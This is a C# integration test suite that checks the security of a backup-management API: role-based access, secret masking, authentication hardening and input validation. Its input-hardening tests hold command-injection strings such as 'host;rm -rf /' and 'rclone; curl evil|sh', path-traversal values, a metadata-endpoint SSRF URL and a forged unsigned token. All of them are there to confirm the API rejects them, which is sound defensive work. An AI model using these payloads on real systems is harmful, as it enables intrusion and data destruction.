using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using Backora.Contracts.Security;
using Backora.Contracts.V1;
using Backora.Contracts.V1.Auth;
using Backora.IntegrationTests.Infrastructure;
using FluentAssertions;
using Microsoft.AspNetCore.Routing;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

namespace Backora.SecurityTests;

public sealed class SecurityFixture : IAsyncLifetime
{
    private readonly PostgresContainer _pg = new();
    public BackoraApiFactory Api { get; private set; } = null!;
    public HttpClient Admin { get; private set; } = null!;

    public async Task InitializeAsync()
    {
        await _pg.InitializeAsync();
        Api = new BackoraApiFactory(await _pg.CreateDatabaseAsync("sec"));
        Admin = await Api.AdminClientAsync();
    }

    public async Task DisposeAsync()
    {
        await Api.DisposeAsync();
        await _pg.DisposeAsync();
    }

    /// <summary>Every routed API endpoint (method + concrete path) with route parameters filled in.</summary>
    public IReadOnlyList<(string Method, string Path, bool Anonymous)> Endpoints()
    {
        var source = Api.Services.GetRequiredService<EndpointDataSource>();
        var list = new List<(string, string, bool)>();
        foreach (var e in source.Endpoints.OfType<RouteEndpoint>())
        {
            var pattern = e.RoutePattern.RawText ?? string.Empty;
            if (!pattern.StartsWith("/api", StringComparison.Ordinal)) continue;
            var path = System.Text.RegularExpressions.Regex.Replace(pattern, @"\{[^}]+\}", "999999");
            var anonymous = e.Metadata.GetMetadata<Microsoft.AspNetCore.Authorization.IAllowAnonymous>() is not null;
            foreach (var m in e.Metadata.GetMetadata<HttpMethodMetadata>()?.HttpMethods ?? []) list.Add((m, path, anonymous));
        }
        return list;
    }
}

public sealed class AccessControlTests(SecurityFixture f) : IClassFixture<SecurityFixture>
{
    private static HttpRequestMessage Request(string method, string path, string? bearer = null)
    {
        var req = new HttpRequestMessage(new HttpMethod(method), path);
        if (method is "POST" or "PUT") req.Content = new StringContent("{}", Encoding.UTF8, "application/json");
        if (bearer is not null) req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", bearer);
        return req;
    }

    [Fact]
    public async Task Every_protected_endpoint_rejects_unauthenticated_requests()
    {
        var client = f.Api.CreateClient();
        var endpoints = f.Endpoints().Where(e => !e.Anonymous).ToList();
        endpoints.Count.Should().BeGreaterThan(80, "all API routes must be enumerated");
        foreach (var (method, path, _) in endpoints)
        {
            var response = await client.SendAsync(Request(method, path));
            response.StatusCode.Should().Be(HttpStatusCode.Unauthorized, $"{method} {path} must require authentication");
        }
    }

    [Fact]
    public async Task Only_explicitly_public_endpoints_allow_anonymous_access()
    {
        var anonymous = f.Endpoints().Where(e => e.Anonymous).Select(e => $"{e.Method} {e.Path}").Order().ToList();
        anonymous.Should().BeEquivalentTo(
        [
            "POST /api/v1/auth/login", "POST /api/v1/auth/login/2fa", "POST /api/v1/auth/refresh",
            "POST /api/v1/auth/password/forgot", "POST /api/v1/auth/password/reset", "POST /api/token",
        ]);
    }

    [Fact]
    public async Task Forged_and_garbage_tokens_are_rejected()
    {
        var client = f.Api.CreateClient();
        foreach (var token in new[] { "garbage", "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.", "bko_notarealtoken" })
        {
            var r = await client.SendAsync(Request("GET", "/api/v1/servers", token));
            r.StatusCode.Should().Be(HttpStatusCode.Unauthorized, token);
        }
    }

    [Fact]
    public async Task Viewer_cannot_call_any_mutating_endpoint()
    {
        var viewer = await f.Api.ClientForRoleAsync(f.Admin, Roles.Viewer);
        var selfService = new[] { "/api/v1/me", "/api/v1/auth/", "/api/token", "/api/v1/backup-jobs/schedule-preview" };
        var mutating = f.Endpoints().Where(e => !e.Anonymous && e.Method is "POST" or "PUT" or "DELETE" && !selfService.Any(s => e.Path.StartsWith(s, StringComparison.Ordinal))).ToList();
        mutating.Should().NotBeEmpty();
        foreach (var (method, path, _) in mutating)
        {
            var req = Request(method, path);
            req.Headers.Authorization = viewer.DefaultRequestHeaders.Authorization;
            var r = await viewer.SendAsync(req);
            r.StatusCode.Should().Be(HttpStatusCode.Forbidden, $"Viewer must not be allowed to {method} {path}");
        }
    }

    [Fact]
    public async Task Viewer_cannot_read_audit_users_settings_or_logs()
    {
        var viewer = await f.Api.ClientForRoleAsync(f.Admin, Roles.Viewer);
        foreach (var path in new[] { "/api/v1/audit", "/api/v1/users", "/api/v1/settings/worker", "/api/v1/settings/smtp", "/api/v1/roles" })
        {
            (await viewer.GetAsync(path)).StatusCode.Should().Be(HttpStatusCode.Forbidden, path);
        }
        (await viewer.GetAsync("/api/v1/dashboard")).StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task Role_matrix_is_enforced_per_resource()
    {
        var operatorClient = await f.Api.ClientForRoleAsync(f.Admin, Roles.BackupOperator);
        var restoreClient = await f.Api.ClientForRoleAsync(f.Admin, Roles.RestoreOperator);
        var auditor = await f.Api.ClientForRoleAsync(f.Admin, Roles.Auditor);

        (await operatorClient.PostAsJsonAsync("/api/v1/servers", Requests.Server("op-" + Guid.NewGuid().ToString("N")[..6]))).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await operatorClient.PostAsync("/api/v1/backup-jobs/999999/runs", null)).StatusCode.Should().Be(HttpStatusCode.NotFound, "operators may run jobs (resource missing → 404, not 403)");
        (await restoreClient.PostAsync("/api/v1/backup-jobs/999999/runs", null)).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await restoreClient.PostAsJsonAsync("/api/v1/restores/precheck", new RestorePrecheckRequest(999999))).StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await operatorClient.PostAsJsonAsync("/api/v1/restores/precheck", new RestorePrecheckRequest(999999))).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await auditor.GetAsync("/api/v1/audit")).StatusCode.Should().Be(HttpStatusCode.OK);
        (await auditor.PutAsJsonAsync("/api/v1/settings/nfs", new NfsSettingsUpdateRequest("h:/x", "/x", null))).StatusCode.Should().Be(HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task Backup_administrator_cannot_escalate_to_platform_administrator()
    {
        var admin = await f.Api.ClientForRoleAsync(f.Admin, Roles.BackupAdministrator);
        // BackupAdministrator has users.read but not users.manage.
        var create = await admin.PostAsJsonAsync("/api/v1/users", new CreateUserRequest("esc@backora.test", "Esc", "Escalation-Pass-2026", [Roles.PlatformAdministrator]));
        create.StatusCode.Should().Be(HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task Users_cannot_change_their_own_roles_or_disable_themselves()
    {
        var me = await (await f.Admin.GetAsync("/api/v1/me")).ReadAsync<CurrentUserDto>();
        var r = await f.Admin.PutAsJsonAsync($"/api/v1/users/{me.Id}", new UpdateUserRequest(me.Name, [Roles.Viewer], true));
        r.StatusCode.Should().Be(HttpStatusCode.UnprocessableEntity);
        var d = await f.Admin.PutAsJsonAsync($"/api/v1/users/{me.Id}", new UpdateUserRequest(me.Name, me.Roles, false));
        d.StatusCode.Should().Be(HttpStatusCode.UnprocessableEntity);
    }

    [Fact]
    public async Task Disabled_user_tokens_stop_working_immediately()
    {
        var email = $"dis-{Guid.NewGuid():N}"[..12] + "@backora.test";
        var created = await (await f.Admin.PostAsJsonAsync("/api/v1/users", new CreateUserRequest(email, "Disable Me", "Initial-Pass-2026x", [Roles.Viewer]))).ReadAsync<UserDto>();
        var client = f.Api.CreateClient();
        var token = await BackoraApiFactory.TryLoginAsync(client, email, "Initial-Pass-2026x");
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        (await client.GetAsync("/api/v1/me")).StatusCode.Should().Be(HttpStatusCode.OK);
        (await f.Admin.PutAsJsonAsync($"/api/v1/users/{created.Id}", new UpdateUserRequest("Disable Me", [Roles.Viewer], false))).EnsureSuccessStatusCode();
        (await client.GetAsync("/api/v1/me")).StatusCode.Should().Be(HttpStatusCode.Unauthorized, "the security stamp changed");
    }

    [Fact]
    public async Task Password_change_gate_blocks_operational_endpoints()
    {
        var email = $"gate-{Guid.NewGuid():N}"[..13] + "@backora.test";
        (await f.Admin.PostAsJsonAsync("/api/v1/users", new CreateUserRequest(email, "Gate", "Initial-Pass-2026x", [Roles.BackupAdministrator]))).EnsureSuccessStatusCode();
        var client = f.Api.CreateClient();
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", await BackoraApiFactory.TryLoginAsync(client, email, "Initial-Pass-2026x"));
        var blocked = await client.GetAsync("/api/v1/servers");
        blocked.StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await blocked.Content.ReadAsStringAsync()).Should().Contain("password_change_required");
        (await client.GetAsync("/api/v1/me")).StatusCode.Should().Be(HttpStatusCode.OK);
    }
}

public sealed class SecretHandlingTests(SecurityFixture f) : IClassFixture<SecurityFixture>
{
    private const string FakeKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nU0VDUkVULUtFWS1NQVRFUklBTC1NVVNULU5PVC1MRUFL\n-----END OPENSSH PRIVATE KEY-----";

    [Fact]
    public async Task Secrets_are_encrypted_at_rest_and_never_returned()
    {
        var name = "sec-" + Guid.NewGuid().ToString("N")[..6];
        var server = await (await f.Admin.PostAsJsonAsync("/api/v1/servers", Requests.Server(name, key: FakeKey))).ReadAsync<ServerDto>();
        var dest = await (await f.Admin.PostAsJsonAsync("/api/v1/storage/s3",
            new S3DestinationUpsertRequest(name, "https://s3.example.test", "us-east-1", "bucket-" + name, "EXAMPLEACCESSKEYID01", "SuperSecretS3Key/Value", true, null, null))).ReadAsync<S3DestinationDto>();
        await (await f.Admin.PostAsJsonAsync("/api/v1/variables", new VariableUpsertRequest("db_password_" + name.Replace("-", "_", StringComparison.Ordinal), true, "VariableSecretValue!", null))).ReadAsync<VariableDto>();
        (await f.Admin.PutAsJsonAsync("/api/v1/settings/smtp", new SmtpSettingsUpdateRequest("smtp.example.test", 587, "user", "SmtpPasswordValue!", "noreply@example.test", "Backora", "StartTls", null, true, null))).EnsureSuccessStatusCode();
        (await f.Admin.PutAsJsonAsync("/api/v1/settings/teams", new TeamsSettingsUpdateRequest("https://example.webhook.office.com/webhookb2/SECRET-PATH-TOKEN", null, true, null))).EnsureSuccessStatusCode();

        var bodies = new StringBuilder();
        foreach (var path in new[] { "/api/v1/servers", $"/api/v1/servers/{server.Id}", "/api/v1/storage/s3", $"/api/v1/storage/s3/{dest.Id}", "/api/v1/variables", "/api/v1/settings/smtp", "/api/v1/settings/teams", "/api/v1/settings/ssh", "/api/v1/audit?pageSize=200" })
        {
            bodies.Append(await (await f.Admin.GetAsync(path)).Content.ReadAsStringAsync());
        }
        var all = bodies.ToString();
        foreach (var secret in new[] { "U0VDUkVULUtFWS1NQVRFUklBTC1NVVNULU5PVC1MRUFL", "SuperSecretS3Key", "VariableSecretValue", "SmtpPasswordValue", "SECRET-PATH-TOKEN", "EXAMPLEACCESSKEYID01" })
        {
            all.Should().NotContain(secret, "secrets must never be returned by the API or written to the audit trail");
        }
        dest.AccessKeyIdMasked.Should().EndWith("SKEY").And.StartWith("•", "access key ids are shown masked (last 4 characters only)");

        await f.Api.WithDbAsync(async db =>
        {
            (await db.Servers.FirstAsync(s => s.Id == server.Id)).PrivateKeyCiphertext.Should().StartWith("bk1:");
            (await db.S3Destinations.FirstAsync(s => s.Id == dest.Id)).SecretKeyCiphertext.Should().StartWith("bk1:");
            (await db.SmtpSettings.FirstAsync()).PasswordCiphertext.Should().StartWith("bk1:");
            (await db.TeamsSettings.FirstAsync()).WebhookUrlCiphertext.Should().StartWith("bk1:");
            (await db.Variables.Where(v => v.IsSecret).Select(v => v.ValueCiphertext).ToListAsync()).Should().OnlyContain(v => v!.StartsWith("bk1:"));
        });
    }

    [Fact]
    public async Task Changing_credentials_requires_the_credentials_permission()
    {
        // BackupOperator has servers.test but not servers.write/credentials.manage.
        var op = await f.Api.ClientForRoleAsync(f.Admin, Roles.BackupOperator);
        (await op.PutAsJsonAsync("/api/v1/settings/ssh", new SshSettingsUpdateRequest(FakeKey, null))).StatusCode.Should().Be(HttpStatusCode.Forbidden);
    }
}

public sealed class InputHardeningTests(SecurityFixture f) : IClassFixture<SecurityFixture>
{
    [Theory]
    [InlineData("$(id)")]
    [InlineData("host;rm -rf /")]
    [InlineData("host name")]
    [InlineData("`whoami`")]
    public async Task Command_injection_in_host_is_rejected(string host)
    {
        var r = await f.Admin.PostAsJsonAsync("/api/v1/servers", new ServerUpsertRequest("inj-" + Guid.NewGuid().ToString("N")[..6], host, 22, "root", null, false, null, null));
        r.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Command_injection_in_ssh_user_is_rejected()
    {
        var r = await f.Admin.PostAsJsonAsync("/api/v1/servers", new ServerUpsertRequest("inj-user", "db01", 22, "root$(id)", null, false, null, null));
        r.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Theory]
    [InlineData("../etc")]
    [InlineData("a/b")]
    [InlineData("job;reboot")]
    [InlineData(".hidden")]
    public async Task Unsafe_job_names_are_rejected(string name)
    {
        var r = await f.Admin.PostAsJsonAsync("/api/v1/backup-jobs", Requests.Job(name, 1, 1));
        r.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await r.Content.ReadAsStringAsync()).Should().Contain("name");
    }

    [Theory]
    [InlineData("/BackoraDB/../etc")]
    [InlineData("relative")]
    [InlineData("/")]
    public async Task Path_traversal_in_nfs_path_is_rejected(string path)
    {
        (await f.Admin.PutAsJsonAsync("/api/v1/settings/nfs", new NfsSettingsUpdateRequest("nfs:/x", path, null))).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Unsafe_worker_paths_are_rejected()
    {
        var r = await f.Admin.PutAsJsonAsync("/api/v1/settings/worker", new WorkerNodeUpdateRequest("worker01", 22, "backora", null, "rclone; curl evil|sh", "/var/tmp/backora", null));
        r.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Metadata_endpoint_ssrf_is_blocked()
    {
        var r = await f.Admin.PostAsJsonAsync("/api/v1/storage/s3/test", new S3TestRequest(null, "http://169.254.169.254", "us-east-1", "bucket-x", "AK", "SK", true, null));
        r.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Teams_webhook_must_be_https()
    {
        (await f.Admin.PutAsJsonAsync("/api/v1/settings/teams", new TeamsSettingsUpdateRequest("http://internal-service:8080/hook", null, true, null))).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Malformed_idempotency_key_is_rejected()
    {
        using var req = new HttpRequestMessage(HttpMethod.Post, "/api/v1/backup-jobs/999999/runs");
        req.Headers.TryAddWithoutValidation(ApiHeaders.IdempotencyKey, "bad key with spaces and <script>");
        (await f.Admin.SendAsync(req)).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Error_responses_are_problem_details_without_internals()
    {
        var notFound = await f.Admin.GetAsync("/api/v1/servers/987654");
        notFound.StatusCode.Should().Be(HttpStatusCode.NotFound);
        notFound.Content.Headers.ContentType!.MediaType.Should().Be("application/problem+json");
        var body = await notFound.Content.ReadAsStringAsync();
        body.Should().Contain("correlationId").And.NotContain("   at ").And.NotContain("Exception");

        var malformed = await f.Admin.PostAsync("/api/v1/servers", new StringContent("{not-json", Encoding.UTF8, "application/json"));
        malformed.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await malformed.Content.ReadAsStringAsync()).Should().NotContain("   at ").And.NotContain("Npgsql");
    }

    [Fact]
    public async Task Security_headers_are_set()
    {
        var r = await f.Admin.GetAsync("/api/v1/me");
        r.Headers.GetValues("X-Content-Type-Options").Should().Contain("nosniff");
        r.Headers.GetValues("X-Frame-Options").Should().Contain("DENY");
        r.Headers.GetValues("Content-Security-Policy").Single().Should().Contain("frame-ancestors 'none'");
        r.Headers.CacheControl!.NoStore.Should().BeTrue();
        r.Headers.Contains(ApiHeaders.CorrelationId).Should().BeTrue();
        r.Headers.Contains("Server").Should().BeFalse();
    }

    [Fact]
    public async Task Oversized_request_bodies_are_rejected()
    {
        var huge = new string('a', 3 * 1024 * 1024);
        var r = await f.Admin.PostAsJsonAsync("/api/v1/templates", Requests.Template("huge", huge));
        ((int)r.StatusCode).Should().BeOneOf(400, 413);
    }
}

public sealed class AuthenticationHardeningTests(SecurityFixture f) : IClassFixture<SecurityFixture>
{
    private const string TestUserPassword = "Initial-Pass-2026x";   // test-only account password
    private async Task<string> NewUserAsync(string role = Roles.Viewer)
    {
        var email = $"auth-{Guid.NewGuid():N}"[..13] + "@backora.test";
        (await f.Admin.PostAsJsonAsync("/api/v1/users", new CreateUserRequest(email, "Auth", "Initial-Pass-2026x", [role]))).EnsureSuccessStatusCode();
        return email;
    }

    [Fact]
    public async Task Login_errors_do_not_reveal_whether_an_account_exists()
    {
        var client = f.Api.CreateClient();
        var unknown = await client.PostAsJsonAsync("/api/v1/auth/login", new LoginRequest("nobody@backora.test", "Whatever-123456"));
        var wrong = await client.PostAsJsonAsync("/api/v1/auth/login", new LoginRequest(TestSecrets.AdminEmail, "Wrong-Password-123"));
        unknown.StatusCode.Should().Be(HttpStatusCode.Unauthorized);
        wrong.StatusCode.Should().Be(HttpStatusCode.Unauthorized);
        var a = await unknown.Content.ReadFromJsonAsync<Dictionary<string, object>>();
        var b = await wrong.Content.ReadFromJsonAsync<Dictionary<string, object>>();
        a!["detail"].ToString().Should().Be(b!["detail"].ToString());
    }

    [Fact]
    public async Task Account_locks_after_repeated_failures()
    {
        var email = await NewUserAsync();
        var client = f.Api.CreateClient();
        for (var i = 0; i < 5; i++) await client.PostAsJsonAsync("/api/v1/auth/login", new LoginRequest(email, "Wrong-Password-123"));
        var r = await client.PostAsJsonAsync("/api/v1/auth/login", new LoginRequest(email, "Initial-Pass-2026x"));
        r.StatusCode.Should().Be(HttpStatusCode.Unauthorized, "the correct password is refused while locked out");
        (await r.Content.ReadAsStringAsync()).Should().Contain("locked");
        var audit = await f.Api.WithDbAsync(db => db.AuditEvents.CountAsync(e => e.Action == "auth.login" && e.Outcome == Domain.AuditOutcome.Failure));
        audit.Should().BeGreaterThanOrEqualTo(5);
    }

    [Fact]
    public async Task Refresh_token_reuse_revokes_the_session()
    {
        var email = await NewUserAsync();
        var client = f.Api.CreateClient();
        var login = await (await client.PostAsJsonAsync("/api/v1/auth/login", new LoginRequest(email, "Initial-Pass-2026x"))).ReadAsync<LoginResponse>();
        var first = login.Tokens!.RefreshToken;
        var rotated = await (await client.PostAsJsonAsync("/api/v1/auth/refresh", new RefreshRequest(first))).ReadAsync<TokenResponse>();
        (await client.PostAsJsonAsync("/api/v1/auth/refresh", new RefreshRequest(first))).StatusCode.Should().Be(HttpStatusCode.Unauthorized, "replaying a rotated token is theft");
        (await client.PostAsJsonAsync("/api/v1/auth/refresh", new RefreshRequest(rotated.RefreshToken))).StatusCode.Should().Be(HttpStatusCode.Unauthorized, "the whole family was revoked");
    }

    [Fact]
    public async Task Personal_access_tokens_work_and_revocation_is_immediate()
    {
        var created = await (await f.Admin.PostAsJsonAsync("/api/v1/me/tokens", new CreatePersonalAccessTokenRequest("ci", 1))).ReadAsync<CreatedPersonalAccessTokenResponse>();
        created.Token.Should().StartWith("bko_");
        var client = f.Api.CreateClient();
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", created.Token);
        (await client.GetAsync("/api/v1/servers")).StatusCode.Should().Be(HttpStatusCode.OK);
        (await f.Admin.DeleteAsync($"/api/v1/me/tokens/{created.Details.Id}")).EnsureSuccessStatusCode();
        (await client.GetAsync("/api/v1/servers")).StatusCode.Should().Be(HttpStatusCode.Unauthorized);
        var stored = await f.Api.WithDbAsync(db => db.ApiTokens.FirstAsync(t => t.Id == created.Details.Id));
        stored.TokenHash.Should().NotContain(created.Token[4..]).And.HaveLength(64);
    }

    [Fact]
    public async Task Legacy_token_endpoint_remains_compatible_and_permission_checked()
    {
        var email = await NewUserAsync(Roles.Viewer);
        var client = f.Api.CreateClient();
        var response = await client.PostAsJsonAsync("/api/token", new { email, password = TestUserPassword, expires_in_minutes = 5 });
        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var body = await response.Content.ReadFromJsonAsync<Dictionary<string, object>>();
        body!["token_type"].ToString().Should().Be("Bearer");
        var token = body["access_token"].ToString()!;
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        // A legacy "viewer" token could create servers in Laravel; it cannot any more.
        var create = await client.PostAsJsonAsync("/api/servers", new { server_name = "legacy-viewer", server_ip = "10.0.0.9", ssh_user = "root", ssh_port = 22 });
        create.StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await client.DeleteAsync("/api/token")).StatusCode.Should().Be(HttpStatusCode.OK);
        (await client.GetAsync("/api/v1/dashboard")).StatusCode.Should().Be(HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task Forgot_password_response_is_uniform()
    {
        var client = f.Api.CreateClient();
        var a = await client.PostAsJsonAsync("/api/v1/auth/password/forgot", new ForgotPasswordRequest("nobody@backora.test"));
        var b = await client.PostAsJsonAsync("/api/v1/auth/password/forgot", new ForgotPasswordRequest(TestSecrets.AdminEmail));
        a.StatusCode.Should().Be(HttpStatusCode.Accepted);
        b.StatusCode.Should().Be(HttpStatusCode.Accepted);
        (await a.Content.ReadAsStringAsync()).Should().Be(await b.Content.ReadAsStringAsync());
    }
}

public sealed class RateLimitTests : IAsyncLifetime
{
    private readonly PostgresContainer _pg = new();
    private BackoraApiFactory _api = null!;

    public async Task InitializeAsync()
    {
        await _pg.InitializeAsync();
        _api = new BackoraApiFactory(await _pg.CreateDatabaseAsync("rl"), new Dictionary<string, string?> { ["RateLimits:LoginPerMinute"] = "3" });
        _ = _api.Server;
    }

    public async Task DisposeAsync()
    {
        await _api.DisposeAsync();
        await _pg.DisposeAsync();
    }

    [Fact]
    public async Task Login_endpoint_is_rate_limited()
    {
        var client = _api.CreateClient();
        var codes = new List<HttpStatusCode>();
        for (var i = 0; i < 6; i++) codes.Add((await client.PostAsJsonAsync("/api/v1/auth/login", new LoginRequest("x@backora.test", "Wrong-Password-1"))).StatusCode);
        codes.Should().Contain(HttpStatusCode.TooManyRequests);
    }
}

public sealed class ClientEncryptionSecurityTests(SecurityFixture f) : IClassFixture<SecurityFixture>
{
    // Valid-looking age identity with a broken checksum, and a valid test identity (generated for tests only).
    private const string Typo = "AGE-SECRET-KEY-1RFVW4Q8J826C3E0N9SNGHSXWDS6R52C59C8G28CAV9KAA5GN5AASH3AM2D";
    private const string Valid = "AGE-SECRET-KEY-1RFVW4Q8J826C3E0N9SNGHSXWDS6R52C59C8G28CAV9KAA5GN5AASH3AM2C";
    private const string Recipient = "age1hu2hz460rykkw50cvjrd92rdeynwyd02f4hmr3fwsgeq5j7vageqvr6ekp";

    [Fact]
    public async Task Generated_private_keys_are_returned_once_uncached_and_never_audited()
    {
        var response = await f.Admin.PostAsync("/api/v1/storage/s3/encryption/generate", null);
        response.StatusCode.Should().Be(HttpStatusCode.OK);
        response.Headers.CacheControl!.NoStore.Should().BeTrue();
        var pair = await response.ReadAsync<GeneratedKeyPairDto>();
        pair.PrivateKey.Should().StartWith("AGE-SECRET-KEY-1");
        pair.Recipient.Should().StartWith("age1");

        var audit = await f.Api.WithDbAsync(db => db.AuditEvents.Where(a => a.Action == "storage.s3.encryption_key_pair_generated").Select(a => a.DetailsJson).ToListAsync());
        audit.Should().Contain(d => d!.Contains(pair.Fingerprint));
        string.Join('\n', audit).Should().NotContain(pair.PrivateKey[16..]);
        var auditApi = await (await f.Admin.GetAsync("/api/v1/audit?pageSize=200")).Content.ReadAsStringAsync();
        auditApi.Should().NotContain(pair.PrivateKey[16..]);

        foreach (var role in new[] { Roles.Viewer, Roles.BackupOperator, Roles.RestoreOperator, Roles.Auditor })
        {
            var client = await f.Api.ClientForRoleAsync(f.Admin, role);
            (await client.PostAsync("/api/v1/storage/s3/encryption/generate", null)).StatusCode.Should().Be(HttpStatusCode.Forbidden, role);
        }
    }

    [Fact]
    public async Task Key_validation_errors_never_echo_the_submitted_key()
    {
        foreach (var (path, body) in new (string, object)[]
        {
            ("/api/v1/recovery-points/999999/verify-key", new VerifyDecryptionKeyRequest(Typo)),
            ("/api/v1/restores/999999/decryption-key", new SubmitDecryptionKeyRequest(Typo)),
            ("/api/v1/restores", new CreateRestoreRequest(999999, "Disaster recovery drill", "restore x", Typo)),
        })
        {
            var r = await f.Admin.PostAsJsonAsync(path, body);
            r.StatusCode.Should().Be(HttpStatusCode.BadRequest, path);
            var text = await r.Content.ReadAsStringAsync();
            text.Should().Contain("checksum").And.NotContain(Typo).And.NotContain(Typo[16..]);
        }
        // A well-formed key for a missing resource: 404, still without echoing it.
        var missing = await f.Admin.PostAsJsonAsync("/api/v1/restores/999999/decryption-key", new SubmitDecryptionKeyRequest(Valid));
        missing.StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await missing.Content.ReadAsStringAsync()).Should().NotContain(Valid[16..]);
    }

    [Fact]
    public async Task Destinations_store_only_public_keys_and_disabling_needs_confirmation()
    {
        var name = "enc-" + Guid.NewGuid().ToString("N")[..6];
        var privateAsRecipient = await f.Admin.PostAsJsonAsync("/api/v1/storage/s3", new S3DestinationUpsertRequest(name, "https://s3.example.test", "us-east-1", "bucket-" + name,
            "AKIAEXAMPLE", "secret", true, null, null, EncryptionModeDto.CustomerKey, Valid));
        privateAsRecipient.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await privateAsRecipient.Content.ReadAsStringAsync()).Should().Contain("PRIVATE key").And.NotContain(Valid[16..]);
        (await f.Admin.PostAsJsonAsync("/api/v1/storage/s3", new S3DestinationUpsertRequest(name, "https://s3.example.test", "us-east-1", "bucket-" + name,
            "AKIAEXAMPLE", "secret", true, null, null, EncryptionModeDto.CustomerKey, null))).StatusCode.Should().Be(HttpStatusCode.BadRequest, "a customer-key destination needs a recipient");

        var dest = await (await f.Admin.PostAsJsonAsync("/api/v1/storage/s3", new S3DestinationUpsertRequest(name, "https://s3.example.test", "us-east-1", "bucket-" + name,
            "AKIAEXAMPLE", "secret", true, null, null, EncryptionModeDto.CustomerKey, Recipient))).ReadAsync<S3DestinationDto>();
        dest.EncryptionRecipient.Should().Be(Recipient);
        var disable = new S3DestinationUpsertRequest(name, "https://s3.example.test", "us-east-1", "bucket-" + name, "", null, true, null, dest.Version, EncryptionModeDto.None);
        var unconfirmed = await f.Admin.PutAsJsonAsync($"/api/v1/storage/s3/{dest.Id}", disable);
        unconfirmed.StatusCode.Should().Be(HttpStatusCode.UnprocessableEntity);
        (await f.Admin.PutAsJsonAsync($"/api/v1/storage/s3/{dest.Id}", disable with { ConfirmDisableEncryption = true })).StatusCode.Should().Be(HttpStatusCode.OK);
        (await f.Api.WithDbAsync(db => db.AuditEvents.AnyAsync(a => a.Action == "storage.s3.encryption_disabled" && a.ResourceId == dest.Id.ToString()))).Should().BeTrue();
        (await f.Api.WithDbAsync(db => db.AuditEvents.AnyAsync(a => a.Action == "storage.s3.encryption_enabled" && a.ResourceId == dest.Id.ToString()))).Should().BeTrue();
    }
}
